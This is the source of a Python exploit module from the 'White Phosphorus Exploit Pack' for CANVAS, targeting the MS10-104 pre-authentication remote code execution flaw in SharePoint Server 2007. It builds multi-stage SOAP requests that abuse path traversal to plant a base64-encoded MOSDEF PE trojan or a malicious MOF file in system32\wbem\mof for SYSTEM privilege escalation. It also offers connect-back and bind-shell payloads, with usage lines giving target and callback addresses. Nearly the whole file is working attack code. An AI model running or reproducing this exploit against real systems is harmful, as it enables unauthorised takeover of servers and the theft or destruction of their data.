
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF import pelib
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer
from libs.canvasos import canvasos


######################################################################################
NAME = "MS10-104 Microsoft Office SharePoint Server 2007 Crafted SOAP Request Remote Code Execution"
DESCRIPTION = "Exploits a pre auth remote code execution vulnerabilty in Microsoft Office SharePoint Server 2007"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION["Date public"] = "2010-12-14"
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION['CVE Name']="CVE-2010-3964"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=2010-3964'
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["References"] = """
http://www.microsoft.com/technet/security/bulletin/MS10-104.mspx
http://www.zerodayinitiative.com/advisories/ZDI-11-023/"""
DOCUMENTATION["Notes"] = """
This module exploits a pre auth remote code execution vulnerability in Microsoft Office SharePoint Server 2007.

The first stage requests the Document Conversions Launcher URL from the Document Conversions LoadBalancer. The second stage sends the payload.

The Auto Privesc target attempts SYSTEM privesc by writing a malicious MOF file to %systemroot%\system32\wbem\mof\ using the Wbem Mof technique found in the Stuxnet worm. When the MOF is executed it drops a MOSDEF PE Trojan in the Default User profile directory and runs it. If this option fails to return a node retry the module and select the standard Windows Universal target.

The standard Windows Universal target writes the payload to the Document Conversions TransformApps directory. A third stage is required to execute it. This target returns a node with lower sharepoint document conversions guest account privilages.

All .exe payloads must be removed manually.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP", "Vista", "7"]
PROPERTY['MSADV']='MS10-104'

NOTES="""
This module exploits a pre auth remote code execution vulnerability in Microsoft Office SharePoint Server 2007.

The first stage requests the Document Conversions Launcher URL from the Document Conversions LoadBalancer. The second stage sends the payload.

The Auto Privesc target attempts SYSTEM privesc by writing a malicious MOF file to %systemroot%\system32\wbem\mof\ using the Wbem Mof technique found in the Stuxnet worm. When the MOF is executed it drops a MOSDEF PE Trojan in the Default User profile directory and runs it. If this option fails to return a node retry the module and select the standard Windows Universal target.

The standard Windows Universal target writes the payload to the Document Conversions TransformApps directory. A third stage is required to execute it. This target returns a node with lower sharepoint document conversions guest account privilages.

All .exe payloads must be removed manually.

-----------------------------------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> MS10-104 Microsoft Office SharePoint Server 2007 Crafted SOAP Request Remote Code Execution
-----------------------------------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Universal

Payloads:
0: TCP Connect Back
1: IE Inject Connect Back
2: HTTPMOSDEF SSL
3: HTTPMOSDEF PLAIN
4: Bind MOSDEF Shell
5: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_ms10_104/wp_ms10_104.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 8093
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal (Auto Privesc)", (0x00000000), [WINALL]],
    1 : ["Windows Universal", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s###########################################################
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Bind MOSDEF Shell",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x0a\x0d"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.DCLauncherURL = ''
        self.autoVersioned = False
        self.use_universal = True
        self.payloadFilename = "".join( [ random.choice(string.lowercase) for x in range(8) ] ) + ".exe"
        self.vProtect = True
        self.useRawShellcode = True
        return

    def usage(self):
        self.wp_usage(targets)
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        ret = 0
        stage1 = self.makestage1()
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))
            s.sendall(stage1)
        except:
            return ret
        
        try:
            reply = s.recv(5555)
            reply += s.recv(5555)
            reply += s.recv(5555)
        except:
            print ''
        s.close()
        
        if 'HtmlTrLauncher' in reply:
            i = reply.find('HtmlTrLauncher')
            j = reply.rfind('http://',0,i)
            reply = reply[j:i]
            reply = reply.replace('/','')
            self.DCLauncherURL = reply.split(':')
            self.port = int(self.DCLauncherURL[2])
            ret = 1
        return ret

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return
    
    def makestage1(self):
        post = 'POST /HtmlTrLoadBalancer HTTP/1.1\r\n'
        post += 'User-Agent: Mozilla/4.0+(compatible; MSIE 6.0; Windows 5.2.3790.131072; MS .NET Remoting; MS .NET CLR 2.0.50727.3053 )\r\n'
        post += 'Content-Type: text/xml; charset="utf-8"\r\n'
        post += 'SOAPAction: "http://schemas.microsoft.com/clr/nsassem/Microsoft.HtmlTrans.IHtmlTrLoadBalancer/Microsoft.HtmlTrans.Interface#StrGetLauncher"\r\n'
        post += 'Host: %s:%d\r\n'%(self.host,self.port)
        post += 'Content-Length: CONTENTLENGTH\r\n'
        post += 'Connection: Keep-Alive\r\n\r\n'
        
        soap = '<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n'
        soap += '<SOAP-ENV:Body>\r\n'
        soap += '<i2:StrGetLauncher id="ref-1" xmlns:i2="http://schemas.microsoft.com/clr/nsassem/Microsoft.HtmlTrans.IHtmlTrLoadBalancer/Microsoft.HtmlTrans.Interface">\r\n'
        soap += '<strTaskName id="ref-3">%s</strTaskName>\r\n'%("".join( [ random.choice(string.lowercase) for x in range(24) ] ))
        soap += '</i2:StrGetLauncher>\r\n'
        soap += '</SOAP-ENV:Body>\r\n'
        soap += '</SOAP-ENV:Envelope>\r\n'
        
        stage1 = post + soap
        stage1 = stage1.replace('CONTENTLENGTH', str((len(soap))))
        return stage1
    
    def makestage2(self):
        self.log("WP> Building MOSDEF PE Trojan")
        myPElib = pelib.PElib()
        try:
            self.mosdeftrojan=myPElib.createPEFileBuf(self.shellcode)
        except Exception, err:
            self.log("WP> Problem building MOSDEF PE Trojan: %s"%(err))
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        
        if self.version == 0:
            self.mosdeftrojan = wp_GenerateMOF(self.mosdeftrojan)
            self.payloadFilename = "".join( [ random.choice(string.lowercase) for x in range(16) ] ) + '.mof'
            self.log("WP> Attempting privesc to SYSTEM via Wbem\Mof")
        
        self.log("WP> Filename: %s"%self.payloadFilename)
        payload = b64encode(self.mosdeftrojan)
        payload = payload[:-1]
        
        post = 'POST /HtmlTrLauncher HTTP/1.1\r\n'
        post += 'User-Agent: Mozilla/4.0+(compatible; MSIE 6.0; Windows 5.2.3790.131072; MS .NET Remoting; MS .NET CLR 2.0.50727.3053 )\r\n'
        post += 'Content-Type: text/xml; charset="utf-8"\r\n'
        post += 'SOAPAction: "http://schemas.microsoft.com/clr/nsassem/Microsoft.HtmlTrans.IDocumentConversionsLauncher/Microsoft.HtmlTrans.Interface#ConvertFile"\r\n'
        post += 'Host: %s:%d\r\n'%(self.host,self.port)
        post += 'Content-Length: CONTENTLENGTH\r\n'
        post += 'Connection: Keep-Alive\r\n\r\n'
        
        soap = '<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n'
        soap += '<SOAP-ENV:Body>\r\n'
        soap += '<i2:ConvertFile id="ref-1" xmlns:i2="http://schemas.microsoft.com/clr/nsassem/Microsoft.HtmlTrans.IDocumentConversionsLauncher/Microsoft.HtmlTrans.Interface">\r\n'
        soap += '<launcherUri id="ref-3">http://%s:%d/HtmlTrLauncher</launcherUri>\r\n'%(self.DCLauncherURL[1],self.port)
        soap += '<appExe id="ref-4"></appExe>\r\n'
        if self.version == 1:
            soap += '<convertFrom id="ref-5">/../../../TransformApps/%s</convertFrom>\r\n'%self.payloadFilename
        else:
            soap += '<convertFrom id="ref-5">/../../../../../../../../Windows/system32/wbem/mof/%s</convertFrom>\r\n'%self.payloadFilename
        soap += '<convertTo id="ref-6"></convertTo>\r\n'
        soap += '<fileBits href="#ref-7"/>\r\n'
        soap += '<taskName id="ref-8"></taskName>\r\n'
        soap += '<configInfo id="ref-9"></configInfo>\r\n'
        soap += '<timeout>300</timeout>\r\n'
        soap += '<fReturnFileBits>true</fReturnFileBits>\r\n'
        soap += '</i2:ConvertFile>\r\n'
        soap += '<SOAP-ENC:Array id="ref-7" xsi:type="SOAP-ENC:base64">' + payload + '</SOAP-ENC:Array>\r\n'
        soap += '</SOAP-ENV:Body>\r\n'
        soap += '</SOAP-ENV:Envelope>\r\n'
        
        stage2 = post + soap
        stage2 = stage2.replace('CONTENTLENGTH', str((len(soap))))
        return stage2
    
    def makestage3(self):
        payload = "".join( [ random.choice(string.lowercase) for x in range(8) ] ) 
        payload = b64encode(payload)
        payload = payload[:-1]
        
        post = 'POST /HtmlTrLauncher HTTP/1.1\r\n'
        post += 'User-Agent: Mozilla/4.0+(compatible; MSIE 6.0; Windows 5.2.3790.131072; MS .NET Remoting; MS .NET CLR 2.0.50727.3053 )\r\n'
        post += 'Content-Type: text/xml; charset="utf-8"\r\n'
        post += 'SOAPAction: "http://schemas.microsoft.com/clr/nsassem/Microsoft.HtmlTrans.IDocumentConversionsLauncher/Microsoft.HtmlTrans.Interface#ConvertFile"\r\n'
        post += 'Host: %s:%d\r\n'%(self.host,self.port)
        post += 'Content-Length: CONTENTLENGTH\r\n'
        post += 'Connection: Keep-Alive\r\n\r\n'
        
        soap = '<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n'
        soap += '<SOAP-ENV:Body>\r\n'
        soap += '<i2:ConvertFile id="ref-1" xmlns:i2="http://schemas.microsoft.com/clr/nsassem/Microsoft.HtmlTrans.IDocumentConversionsLauncher/Microsoft.HtmlTrans.Interface">\r\n'
        soap += '<launcherUri id="ref-3">http://%s:%d/HtmlTrLauncher</launcherUri>\r\n'%(self.DCLauncherURL[1],self.port)
        soap += '<appExe id="ref-4">%s</appExe>\r\n'%self.payloadFilename
        soap += '<convertFrom id="ref-5"></convertFrom>\r\n'
        soap += '<convertTo id="ref-6"></convertTo>\r\n'
        soap += '<fileBits href="#ref-7"/>\r\n'
        soap += '<taskName id="ref-8"></taskName>\r\n'
        soap += '<configInfo id="ref-9"></configInfo>\r\n'
        soap += '<timeout>300</timeout>\r\n'
        soap += '<fReturnFileBits>true</fReturnFileBits>\r\n'
        soap += '</i2:ConvertFile>\r\n'
        soap += '<SOAP-ENC:Array id="ref-7" xsi:type="SOAP-ENC:base64">' + payload + '</SOAP-ENC:Array>\r\n'
        soap += '</SOAP-ENV:Body>\r\n'
        soap += '</SOAP-ENV:Envelope>\r\n'
        
        stage3 = post + soap
        stage3 = stage3.replace('CONTENTLENGTH', str((len(soap))))
        return stage3

    def run(self):
        self.getArgs()
        self.result_error = 0
        
        stage1 = self.makestage1()
        
        self.log("WP> Sending Exploit: Stage 1")
        self.log("WP> Requesting DCLauncher URL from DCLoadBalancer")
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))
            s.sendall(stage1)
        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        try:
            reply = s.recv(5555)
            reply += s.recv(5555)
            reply += s.recv(5555)
        except:
            print ''
        s.close()
        
        if 'HtmlTrLauncher' in reply:
            i = reply.find('HtmlTrLauncher')
            j = reply.rfind('http://',0,i)
            reply = reply[j:i]
            self.log("WP> DCLauncher located at: %s"%reply)
            reply = reply.replace('/','')
            self.DCLauncherURL = reply.split(':')
            self.port = int(self.DCLauncherURL[2])
        else:
            self.log("WP> Invalid response from DCLoadBalancer")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        
        stage2 = self.makestage2()
        self.log("WP> Sending Exploit: Stage 2")
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))
            s.sendall(stage2)
        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        
        try:
            reply = s.recv(5555)
        except:
            print ''
        s.close()
        time.sleep(5)
        
        if self.version == 1:
            stage3 = self.makestage3()
            self.log("WP> Sending Exploit: Stage 3")
            try:            
                s = self.gettcpsock()
                s.connect((self.host, self.port))
                s.sendall(stage3)
            except:
                self.log("WP> Attack reported no open socket - service died?")
                self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
                return 0
            try:
                reply = s.recv(5555)
            except:
                print ''
                
            time.sleep(3)
        
        # Check if follow up is required for some shellcodes
        if self.result_error==0:
            ret = self.wp_postExploitShellcode(s)
            if ret:
                return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
